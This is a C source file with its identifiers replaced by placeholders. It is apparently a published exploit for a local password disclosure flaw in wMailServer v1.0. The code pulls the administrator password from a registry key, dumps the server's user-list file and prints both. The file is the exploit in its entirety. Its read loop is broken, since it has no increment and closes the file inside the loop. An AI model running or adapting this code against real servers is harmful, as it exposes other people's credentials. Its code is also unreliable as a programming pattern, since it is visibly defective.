
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;
typedef int BYTE ;


 scalar_t__ VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 scalar_t__ FUNC_0 (int ,char*,int ,int ,int *) ;
 scalar_t__ FUNC_1 (int ,char*,int *,int *,int *,int *) ;
 char* VAR_3 ;
 int VAR_4 ;
 int FUNC_2 (int *) ;
 char* VAR_5 ;
 int * FUNC_3 (char*,char*) ;
 int FUNC_4 (int ,char*,...) ;
 char FUNC_5 (int *) ;
 int VAR_6 ;
 int FUNC_6 (char*,char*) ;
 int FUNC_7 (char*) ;
 char* VAR_7 ;
 int VAR_8 ;
 int FUNC_8 (char*,char*) ;

int FUNC_9()
{

if( FUNC_0( VAR_1,"Software\\Darsite\\MAILSRV\\Admin",0,VAR_2,&VAR_6) !=VAR_0 )
{
FUNC_4( VAR_8, "Aucune clef wMailServer en vue !\n" );
return -1;
}

if( FUNC_1( VAR_6,"",((void*)0),((void*)0),(BYTE *)&VAR_7,&VAR_4) != VAR_0 )
FUNC_6( VAR_7,"Vide\n" );

FUNC_4( VAR_8, "\n\n-------------------------------------------\n" );
FUNC_4( VAR_8, "SoftiaCom Software - wMailServer v1.0\n" );
FUNC_4( VAR_8, "Local Password Disclosure Vulnerability\n\n" );
FUNC_4( VAR_8, "Discovered & coded by fRoGGz - SecuBox Labs\n\n" );
FUNC_4( VAR_8, "-------------------------------------------\n\n" );
FUNC_4( VAR_8, "Mot de passe Administrateur\t: %s\n", VAR_7 );

int VAR_9;
FILE *VAR_10;
char VAR_11[100];

FUNC_8(VAR_5,"\\WINNT\\MAILSRV\\userlist");

if((VAR_10=FUNC_3(VAR_5,"rb")) == ((void*)0))
{
FUNC_7("Pas cool !\n");
return -1;
}

for(VAR_9=0;VAR_9<99;VAR_9 )
{
VAR_11[VAR_9]=FUNC_5(VAR_10);
FUNC_8(VAR_3,VAR_11);
FUNC_2(VAR_10);
}

FUNC_4( VAR_8, "\nListe des comptes utilisateurs\n\n %s\n", VAR_3 );
return 0;
}
